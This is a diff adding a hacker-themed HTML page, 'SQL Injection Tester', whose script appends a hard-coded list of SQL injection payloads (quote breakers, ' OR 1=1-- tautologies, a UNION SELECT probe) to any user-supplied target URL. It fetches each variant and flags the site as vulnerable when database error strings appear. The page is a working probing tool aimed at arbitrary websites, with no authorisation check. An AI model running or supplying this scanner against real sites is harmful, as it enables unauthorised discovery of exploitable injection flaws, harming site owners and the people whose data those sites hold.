@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SQL Injection Tester</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #000;
+      color: #c58b00;
+      overflow-x: hidden;
+    }
+    video#bg-video {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      min-width: 100vw;
+      min-height: 100vh;
+      object-fit: cover;
+      opacity: 0.2;
+      z-index: -2;
+    }
+    audio#bg-music {
+      position: fixed;
+      z-index: -1;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .container {
+      max-width: 920px;
+      margin: 50px auto;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.7);
+    }
+    h1, label {
+      color: #c58b00;
+    }
+    input, textarea, pre, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: rgba(0, 0, 0, 0.5);
+      color: #c58b00;
+      border: 1px solid #c58b00;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    button {
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #000;
+      color: red;
+    }
+    .section {
+      margin-top: 20px;
+    }
+    .history-item {
+      border-bottom: 1px solid red;
+      padding: 5px;
+      font-size: 0.9rem;
+      color: #c58b00;
+    }
+    @media (max-width: 768px) {
+      .container { margin: 20px 10px; padding: 15px; }
+      button { width: 100%; margin: 8px 0; }
+    }
+  </style>
+</head>
+<body>
+
+<video id="bg-video" autoplay muted loop playsinline>
+  <source src="background/1761817527453041720p.mp4" type="video/mp4">
+</video>
+<audio id="bg-music" loop>
+  <source src="background/Programming___Coding___Hacking_music_vol.18__ANONYMOUS_HEADQUARTERS_(48k).mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
+  <h1>SQL Injection Tester</h1>
+
+  <label for="url-input">Target URL (with parameter):</label>
+  <input id="url-input" placeholder="https://example.com/item.php?id=">
+
+  <button onclick="runSQLiTest()">Run SQLi Test</button>
+  <button onclick="clearAll()">Clear</button>
+
+  <div class="section">
+    <h3>Test Result</h3>
+    <pre id="result-box">{}</pre>
+  </div>
+
+  <div class="section">
+    <h3>Raw Response</h3>
+    <pre id="raw-response" style="max-height: 300px; overflow-y: auto;"></pre>
+  </div>
+
+  <div class="section">
+    <h3>History</h3>
+    <div id="history-box"></div>
+  </div>
+</div>
+
+<script>
+  const music = document.getElementById("bg-music");
+  const urlInput = document.getElementById("url-input");
+  const resultBox = document.getElementById("result-box");
+  const rawBox = document.getElementById("raw-response");
+  const historyBox = document.getElementById("history-box");
+  const history = [];
+
+  const payloads = [
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1--",
+    "\" OR 1=1--",
+    "';--",
+    "' AND 1=2 UNION SELECT null--"
+  ];
+
+  window.addEventListener("click", () => {
+    music.play().catch(() => {});
+  }, { once: true });
+
+  function runSQLiTest() {
+    const baseUrl = urlInput.value.trim();
+    if (!baseUrl.includes("=")) {
+      alert("Please provide a URL with a parameter to test.");
+      return;
+    }
+
+    let results = "";
+    let found = false;
+    let completed = 0;
+
+    payloads.forEach(payload => {
+      const fullURL = baseUrl + encodeURIComponent(payload);
+      fetch(fullURL)
+        .then(res => res.text())
+        .then(html => {
+          const indicators = ["SQL syntax", "mysql_fetch", "ORA-", "SQLite", "You have an error", "Warning:"];
+          const detected = indicators.some(ind => html.includes(ind));
+          if (detected) {
+            results += `🛑 Vulnerable with payload: ${payload}\n`;
+            found = true;
+          } else {
+            results += `✅ Safe with payload: ${payload}\n`;
+          }
+          if (++completed === payloads.length) {
+            resultBox.textContent = results;
+            rawBox.textContent = "Last response:\n" + html.slice(0, 2000);
+            logHistory(baseUrl, found);
+          }
+        })
+        .catch(err => {
+          resultBox.textContent = `⚠️ Error: ${err.message}`;
+          rawBox.textContent = "";
+        });
+    });
+  }
+
+  function clearAll() {
+    urlInput.value = "";
+    resultBox.textContent = "{}";
+    rawBox.textContent = "";
+  }
+
+  function logHistory(url, found) {
+    const time = new Date().toLocaleTimeString();
+    history.unshift(`${time} → ${found ? "🛑 SQLi Detected" : "✅ Safe"} → ${url}`);
+    updateHistory();
+  }
+
+  function updateHistory() {
+    historyBox.innerHTML = "";
+    history.slice(0, 10).forEach(h => {
+      const div = document.createElement("div");
+      div.className = "history-item";
+      div.textContent = h;
+      historyBox.appendChild(div);
+    });
+  }
+</script>
+
+</body>
+</html>
